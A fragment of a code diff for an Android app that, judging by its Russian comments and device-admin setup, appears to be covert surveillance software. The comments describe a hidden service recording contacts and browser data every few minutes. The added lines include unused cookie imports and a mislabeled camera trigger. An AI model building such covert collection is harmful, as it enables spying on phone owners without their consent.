@@ -14,6 +14,7 @@ import android.media.RingtoneManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
+import android.provider.MediaStore;
 import android.support.v4.content.AsyncTaskLoader;
 import android.support.v7.app.AppCompatActivity;
 
@@ -21,6 +22,8 @@ import android.os.Bundle;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
+import android.webkit.CookieManager;
+import android.webkit.CookieSyncManager;
 import android.widget.Button;
 import android.widget.Toast;
 
@@ -40,6 +43,8 @@ import com.postal.omniscient.postal.service.StartService;
 
 import org.greenrobot.eventbus.EventBus;
 
+import java.net.CookieHandler;
+import java.net.CookiePolicy;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
@@ -51,14 +56,16 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private static final int REQUEST_CODE = 0;
     private DevicePolicyManager mDPM;
     private ComponentName mAdminName;
-    private Button registration;
+    private Button registration, cookie;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         registration = (Button)findViewById(R.id.registration);
+        cookie = (Button)findViewById(R.id.cookie);
         registration.setOnClickListener(this);
+        cookie.setOnClickListener(this);
 
     }
 
@@ -73,6 +80,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
 
     private void startAPP(){
+
         //        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
         //БУДЕТ СЕРВИС КАЖДЫЕ 5 ин и записывает еонтакты и браузер
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
@@ -182,9 +190,21 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
-            case R.id.registration:startAPP();break;
+            case R.id.registration:startAPP(); Log.i(Msg, "NOTES ME SEMPAI");break;
+            case R.id.cookie:dispatchTakePictureIntent();break;
         }
     }
+
+    private void dispatchTakePictureIntent() {
+        final int REQUEST_IMAGE_CAPTURE = 1;
+
+        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
+            startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
+        }
+    }
+
+
 
     public class AsyncM extends AsyncTaskLoader {
 
